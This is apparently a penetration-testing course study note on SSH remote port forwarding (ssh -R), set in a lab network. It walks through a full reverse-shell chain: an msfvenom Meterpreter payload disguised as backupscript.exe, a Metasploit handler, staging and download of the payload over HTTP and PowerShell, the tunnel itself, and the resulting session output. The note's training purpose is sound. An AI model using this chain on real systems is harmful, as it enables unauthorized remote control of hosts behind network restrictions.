# 🔄 1. Remote / Reverse Port Forwarding with SSH

> [!info]  
> **Remote SSH port forwarding (`ssh -R`)** is useful when a compromised or pivoted host can reach a target, but the target **cannot directly reach the attack host**.
> 
> Instead of forcing the target to connect directly to the attacker, we make the pivot host expose a port that **forwards the target's connection backward through the existing SSH connection** to our attack host.

---

# 🧠 2. The Problem: Reverse Connections Cannot Reach the Attack Host

In a normal pivoting situation:

```text
                    SSH
Attack Host ──────────────────> Ubuntu Pivot
10.10.15.5                       10.129.15.50
                                  |
                                  | 172.16.5.129
                                  ↓
                            Windows A
                            172.16.5.19
```

The attacker can reach Ubuntu, and Ubuntu can reach Windows A.

However, Windows A **does not have a route back to the Academy/attack network**.

```text
Attack Host
10.10.15.5
     ▲
     │
     │ ❌ No route
     │
Windows A
172.16.5.19
```

Windows A is effectively restricted to its internal network:

```text
172.16.5.0/23
```

Therefore, if Windows A executes a reverse-shell payload configured like:

```text
LHOST = 10.10.15.5
```

the connection fails because Windows A cannot route traffic toward `10.10.15.5`.

> [!important]  
> **The key problem is not the payload.**
> 
> The problem is **network reachability**.
> 
> A reverse shell requires:
> 
> ```text
> Target ────────────────> Listener
> ```
> 
> If the target cannot route to the listener, the reverse shell cannot establish.

---

# 🎯 3. Why Remote Port Forwarding Solves the Problem

We already have a host that can communicate with **both sides**:

```text
             Attack Network
             10.10.15.0/24
                    |
                    |
             10.129.15.5
             Attack Host
                    |
                    | SSH
                    ↓
          Ubuntu Pivot Server
          10.129.15.50
          172.16.5.129
                    |
                    |
                    ↓
             Windows A
             172.16.5.19
```

Ubuntu is therefore the **pivot host**.

Instead of asking Windows A to connect directly to:

```text
10.10.15.5:8000
```

we make Windows A connect to:

```text
172.16.5.129:8080
```

Ubuntu then forwards that connection through the existing SSH connection to:

```text
10.10.15.5:8000
```

The resulting path is:

```text
Windows A
172.16.5.19
     |
     | connects to
     ↓
Ubuntu Pivot
172.16.5.129:8080
     |
     | SSH reverse port forward
     ↓
Attack Host
10.10.15.5:8000
     |
     ↓
Metasploit Handler
```

---

# 🧠 4. Mental Model: `ssh -R`

The most important thing to remember is:

```text
ssh -R <REMOTE_LISTEN_IP>:<REMOTE_PORT>:<DESTINATION>:<DESTINATION_PORT>
```

Think:

```text
             REMOTE SIDE
                  ↓
       ┌─────────────────────┐
       │   Ubuntu Pivot      │
       │  172.16.5.129:8080  │
       └──────────┬──────────┘
                  │
                  │ SSH tunnel
                  │
                  ↓
       ┌─────────────────────┐
       │    SSH Client       │
       │   Attack Host       │
       └──────────┬──────────┘
                  │
                  ↓
          10.10.15.5:8000
          Metasploit Handler
```

### 🔑 The critical distinction

With `-R`:

```text
-R
```

means:

> **Create the listening socket on the SSH server/remote side and forward connections through the SSH connection toward the SSH client side.**

This is why it is called **remote port forwarding**.

---

# 🔀 5. Local vs Remote vs Dynamic Forwarding

|Technique|SSH Option|Where Listener Exists|Typical Purpose|
|---|---|---|---|
|Local port forwarding|`-L`|SSH client/local machine|Bring a remote service to your local machine|
|Remote port forwarding|`-R`|SSH server/remote machine|Make a local service reachable from the remote side|
|Dynamic port forwarding|`-D`|SSH client/local machine|SOCKS proxy / access multiple destinations dynamically|

### 🧠 Simple memory trick

```text
-L → Local listener
-R → Remote listener
-D → Dynamic SOCKS proxy
```

For this scenario:

```text
Windows → Ubuntu:8080 → SSH tunnel → Attack Host:8000
```

therefore:

```text
-R
```

is the appropriate technique.

---

# 💣 6. Why We Want a Meterpreter Session

Having only RDP access may not be sufficient.

A penetration tester may need to:

- Upload/download files
    
- Execute exploits
    
- Perform deeper enumeration
    
- Interact with Windows APIs
    
- Use Meterpreter capabilities
    
- Work around disabled RDP clipboard functionality
    
- Obtain a more flexible command/session interface
    

The built-in Windows executables can perform many tasks, but a Meterpreter session can provide additional functionality useful during an assessment.

> [!important]  
> The objective is therefore not simply:
> 
> **"Get RDP access."**
> 
> It is:
> 
> **"Establish a flexible session on Windows despite the network preventing a direct reverse connection."**

---

# 🧬 7. Payload Architecture

The payload must be configured to connect to the **pivot host**, not directly to the attack host.

The intended path is:

```text
Windows Payload
      |
      | HTTPS reverse connection
      ↓
172.16.5.129:8080
      |
      | Remote SSH port forward
      ↓
10.10.15.5:8000
      |
      ↓
Metasploit multi/handler
```

Therefore:

```text
Payload LHOST = 172.16.5.129
Payload LPORT = 8080
```

while the Metasploit listener is:

```text
LHOST = 0.0.0.0
LPORT = 8000
```

> [!warning]  
> **Do not confuse the payload's callback address with the Metasploit listener's address.**
> 
> The payload must connect to the address that **Windows can actually reach**:
> 
> ```text
> 172.16.5.129:8080
> ```
> 
> The SSH tunnel then transports that connection to:
> 
> ```text
> 10.10.15.5:8000
> ```

---

# 💻 8. Create the Windows Payload with `msfvenom`

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

Example output:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### 🔎 Important parameters

|Parameter|Meaning|
|---|---|
|`-p windows/x64/meterpreter/reverse_https`|Windows x64 Meterpreter HTTPS reverse payload|
|`lhost=<InternalIPofPivotHost>`|Address the Windows target will connect to|
|`LPORT=8080`|Port exposed by the pivot host|
|`-f exe`|Generate a Windows executable|
|`-o backupscript.exe`|Save the payload as `backupscript.exe`|

The important relationship is:

```text
Windows payload
      |
      | HTTPS
      ↓
172.16.5.129:8080
```

---

# 🎧 9. Configure the Metasploit Handler

On the attack host:

```text
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

### 🧠 Why `0.0.0.0`?

```text
0.0.0.0
```

means the listener accepts connections on the available local interfaces rather than binding to one specific interface.

The important part is:

```text
Attack Host
0.0.0.0:8000
      ↑
      |
SSH tunnel forwards here
```

---

# 📦 10. Transfer the Payload to the Pivot Host

Because SSH access to Ubuntu already exists, `scp` can be used:

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

Example:

```text
backupscript.exe                                   100% 7168    65.4KB/s   00:00
```

This puts:

```text
backupscript.exe
```

on the Ubuntu pivot host.

---

# 🌐 11. Host the Payload from Ubuntu

On Ubuntu, from the directory containing the payload:

```bash
python3 -m http.server 8123
```

This creates a simple HTTP server on:

```text
Ubuntu:8123
```

The purpose is simply to make the payload downloadable by Windows A.

The path is now:

```text
Attack Host
     |
     | scp
     ↓
Ubuntu
backupscript.exe
     |
     | HTTP :8123
     ↓
Windows A
```

---

# 📥 12. Download the Payload on Windows

Windows can retrieve the file using PowerShell:

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### 🔎 What happens?

```text
Windows A
172.16.5.19
      |
      | HTTP GET
      ↓
Ubuntu
172.16.5.129:8123
      |
      ↓
backupscript.exe
```

This works because Windows A **can reach the Ubuntu server on the internal network**.

---

# 🔄 13. Create the SSH Remote Port Forward

Now comes the critical step.

On the attack host:

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Example conceptually:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

### 🔎 Break the command apart

```text
ssh
│
├── -R
│    └── Create a remote port forward
│
├── 172.16.5.129:8080
│    └── Remote/pivot listener
│
├── 0.0.0.0:8000
│    └── Destination on SSH client/attack host
│
├── ubuntu@<ipAddressofTarget>
│    └── SSH connection to Ubuntu
│
├── -v
│    └── Verbose SSH output
│
└── -N
     └── Do not execute a remote login shell
```

### 🧠 The actual forwarding relationship

```text
172.16.5.129:8080
        │
        │ SSH -R
        ↓
0.0.0.0:8000
```

Therefore:

```text
Windows A
172.16.5.19
      |
      | connect :8080
      ↓
Ubuntu
172.16.5.129:8080
      |
      | SSH tunnel
      ↓
Attack Host
0.0.0.0:8000
      |
      ↓
Metasploit Handler
```

---

# 🔥 14. Why `-vN` Is Used

## `-v`

Enables verbose SSH output.

This is extremely useful during tunneling because you can observe:

- Forwarding requests
    
- Connections
    
- Channels being created
    
- Channels connecting
    
- Channels being closed
    

Without verbose output, troubleshooting the tunnel becomes harder.

## `-N`

Tells SSH:

> Do not execute a remote command or open an interactive shell.

We only need the SSH connection to maintain the tunnel.

Therefore:

```text
-vN
```

essentially means:

```text
"Keep the SSH tunnel alive and show me what it is doing."
```

---

# 🧪 15. Execute the Payload

Once:

1. The payload exists on Windows.
    
2. The Metasploit handler is running.
    
3. The SSH remote port forward is running.
    

Execute:

```text
C:\backupscript.exe
```

The payload attempts:

```text
Windows A
172.16.5.19
      |
      | HTTPS → 172.16.5.129:8080
      ↓
Ubuntu Pivot
172.16.5.129:8080
      |
      | SSH tunnel
      ↓
Attack Host
:8000
      |
      ↓
Metasploit Handler
```

The Windows host **never needs a route to the attack host**.

That is the entire reason this technique works.

---

# 🔎 16. Understanding the SSH Debug Output

The pivot host shows:

```text
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

### 🧠 Read the output as a story

The important line is:

```text
client_request_forwarded_tcpip:
listen 172.16.5.129 port 8080,
originator 172.16.5.19
```

This tells us:

```text
Windows A
172.16.5.19
      |
      | connected to
      ↓
Ubuntu
172.16.5.129:8080
```

SSH then attempts:

```text
connect_next:
host 0.0.0.0 port 8000
```

Meaning:

```text
Ubuntu:8080
     |
     | SSH tunnel
     ↓
Attack Host:8000
```

Then:

```text
channel 1: connected to 0.0.0.0 port 8000
```

confirms that the forwarded connection successfully reached the Metasploit listener.

---

# 🧬 17. Complete Connection Flow

```text
                         ATTACK NETWORK
                    10.10.15.5
                         │
                         │
                  ┌──────▼──────┐
                  │ Attack Host │
                  │             │
                  │ MSF Handler │
                  │    :8000    │
                  └──────▲──────┘
                         │
                         │ SSH tunnel
                         │
                  ┌──────┴──────┐
                  │    Ubuntu   │
                  │    Pivot    │
                  │             │
                  │172.16.5.129 │
                  │    :8080    │
                  └──────▲──────┘
                         │
                         │ HTTPS
                         │
                  ┌──────┴──────┐
                  │  Windows A  │
                  │172.16.5.19  │
                  │             │
                  │ Meterpreter │
                  │   Payload   │
                  └─────────────┘
```

### 🔄 Traffic direction

```text
Windows A
    │
    │ 1. Reverse HTTPS connection
    ▼
Ubuntu:8080
    │
    │ 2. Remote SSH port forwarding
    ▼
Attack Host:8000
    │
    │ 3. Metasploit receives connection
    ▼
Meterpreter Session
```

---

# 🖥️ 18. Meterpreter Session

If everything works:

```text
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

---

# 🧠 19. Why Does Meterpreter Show `127.0.0.1`?

This is one of the most confusing parts of the technique.

You may expect:

```text
Windows A
172.16.5.19
```

but Metasploit reports:

```text
127.0.0.1
```

This is because the final connection into the Metasploit handler is arriving through the **local SSH forwarding mechanism**.

The logical path is:

```text
Windows
172.16.5.19
     ↓
Ubuntu:8080
     ↓
SSH tunnel
     ↓
Attack Host
127.0.0.1 / local socket
     ↓
Metasploit:8000
```

Therefore Metasploit sees the connection as coming through its local side of the SSH tunnel rather than receiving a direct TCP connection from:

```text
172.16.5.19
```

> [!important]  
> `127.0.0.1` in the Meterpreter output **does not mean Windows A is literally connecting directly to itself**.
> 
> It is describing the endpoint from which the Metasploit handler receives the forwarded connection.

---

# 🔎 20. Confirming the Connection with `netstat`

The lesson notes that `netstat` can show the incoming connection as originating from the SSH service.

This is another way to understand the tunnel:

```text
Windows
   ↓
Ubuntu
   ↓
SSH connection
   ↓
Attack Host
   ↓
Metasploit
```

The SSH process is effectively acting as the **transport mechanism for the reverse connection**.

---

# 🧠 21. The Most Important Mental Model

The entire technique can be remembered as:

```text
❌ WITHOUT REMOTE PORT FORWARDING

Windows ───────────────X──────────────> Attack Host
          No route


✅ WITH SSH -R

Windows
  │
  │ Can reach Ubuntu
  ▼
Ubuntu:8080
  │
  │ SSH tunnel
  ▼
Attack Host:8000
  │
  ▼
Metasploit
```

The crucial insight is:

> **We do not make Windows learn a new route to the attack network. We make the pivot host become the reachable front door for the reverse connection.**

---

# 🧭 22. Methodology: How Would I Think of This During CPTS?

When you encounter this situation, reason from **network reachability**, not from the tool you want to use.

```text
                🔎 Need reverse connection?
                         │
                         ▼
              Can target reach attacker?
                    /           \
                  YES            NO
                   │              │
                   ▼              ▼
             Normal reverse    Find pivot
                shell             │
                                  ▼
                       Can pivot reach both?
                            /          \
                          NO            YES
                          │              │
                          ▼              ▼
                   Find another       Use pivot
                     route             │
                                      ▼
                            Need reverse connection
                                      │
                                      ▼
                             SSH Remote Forward
                                   `ssh -R`
                                      │
                                      ▼
                          Pivot listens on reachable port
                                      │
                                      ▼
                         Forward through SSH tunnel
                                      │
                                      ▼
                             Attacker listener
```

### 🎯 CPTS thought process

The important question is **not**:

> "Which reverse-shell command should I use?"

The important question is:

> **"From where can the target actually reach?"**

If:

```text
Target → Attacker ❌
Target → Pivot    ✅
Pivot  → Attacker ✅
```

then:

```text
Target → Pivot → SSH tunnel → Attacker
```

is the logical solution.

---

# ⚖️ 23. Remote Port Forwarding vs Dynamic Pivoting

Remote port forwarding and dynamic forwarding solve different problems.

### Dynamic forwarding

```text
Attacker
   │
   │ SOCKS
   ▼
Pivot
   │
   ├──→ Internal Server A
   ├──→ Internal Server B
   └──→ Internal Server C
```

Useful when the attacker wants to **initiate connections into an otherwise inaccessible network**.

### Remote forwarding

```text
Target
   │
   │ reverse connection
   ▼
Pivot
   │
   │ SSH tunnel
   ▼
Attacker
```

Useful when the **target needs to initiate a connection back toward the attacker**, but cannot reach the attacker's network directly.

---

# 📊 24. Port Mapping Cheat Sheet

```text
Payload destination:
    172.16.5.129:8080
           │
           ▼
     Ubuntu Pivot
           │
           │ ssh -R
           ▼
Attack Host:8000
           │
           ▼
    MSF Handler
```

|Component|Address / Port|Purpose|
|---|---|---|
|Windows A|`172.16.5.19`|Executes reverse payload|
|Ubuntu Pivot|`172.16||